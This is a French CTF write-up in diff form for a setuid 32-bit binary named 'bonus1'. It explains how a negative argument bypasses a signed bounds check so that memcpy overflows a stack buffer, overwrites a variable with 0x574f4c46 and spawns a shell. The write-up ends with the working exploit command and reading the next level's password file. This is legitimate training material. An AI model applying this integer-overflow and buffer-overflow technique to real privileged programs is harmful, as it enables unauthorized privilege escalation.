@@ -1,0 +1,67 @@
+# Bonus 1
+## Résumé
+Condition mal bornée => utilisation d'un nombre négatif pour passer la condition => partie négative perdue => buffer overflow => eçriture dans `n` => execl(bin/sh)
+## Préambule
+```sh
+$> ls -l
+total 8
+-rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1
+$> file bonus1 
+bonus1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x5af8fd13428afc6d05de1abfa9d7e7621df174c7, not stripped
+```
+Le home contient un binaire appartenant à l'user `bonus2` et avec un `suid`. On doit donc exploiter ce binaire pour pouvoir accéder au fichier `/home/user/bonus2/.pass`.
+
+On récupère le fichier `bonus1` sur la VM pour le désassembler avec `radare2` :
+```sh
+$> scp -P 4242 bonus1@10.11.200.192:/home/user/bonus1/bonus1 .
+$> r2 bonus1
+```
+
+
+## Analyse
+### Analyse du programme
+Dans la fonction `main`, on peut voir que le premier argument du programme (`argv[1]`) est transformé en nombre avec `atoi()`. Il y a ensuite une condition, si ce nombre `n` est superieur a 9 alors le programme se termine. 
+Ensuite, il y a un appel a `memcpy()` pour copier le second argument (`argv[2]`) avec une size egale a 4 fois `n`.
+Et pour finir, si `n` egal 0x574f4c46, alors le probleme execute `execl`, qui nous donnera acces au shell.
+
+
+### Mise en place de l'exploitation
+La fonction `atoi(argv[1])` enregistre son resultat dans `n`.
+La fonction `memcpy` copie `argv[2]` dans un buffer `dest` qui se situe juste en dessous de n.
+
+--> argv
+--> argc
+--> EIP
+--> EBP
+--> 
+--> n:		(esp+0x3c)
+--> 
+--> dest:	(esp+0x14)
+--> 
+--> esp
+
+Donc le but etant d'ecrire assez loin dans `dest` avec `memcpy` pour ecraser `n` et le remplacer par `0x574f4c46` et passer la condition, pour acceder au shell
+Au vu des adresses des variables, on peut en deduire qu'il nous faut au minimum ecrire sur 44.
+(0x3c) - (0x14) = 60 - 20 = 40
+
+Int: 			[-2 147 483 648, 2 147 483 647]
+Unsigned Int:	 			 [0, 4 294 967 295]
+
+Contraintes: 
+	n <= 9
+	n * 4 >= 44
+
+Premier argument: 
+On cherche à écrire 44 bytes, donc 44 / 4 = 11
+Comme on veut on nombre négatif, on va partir du LONG_MIN: −2147483648 -(2^32/2)
+puis on rajoute 11 : −2147483648 + 11 = −2147483637
+Second argument:
+'A'*40 + 0x574f4c46
+
+
+## Application
+```sh
+$> ./bonus1 -2147483637 $(python -c 'print("A"*40 + "\x46\x4c\x4f\x57")')
+$ cd ../bonus2/
+$ cat .pass 
+```
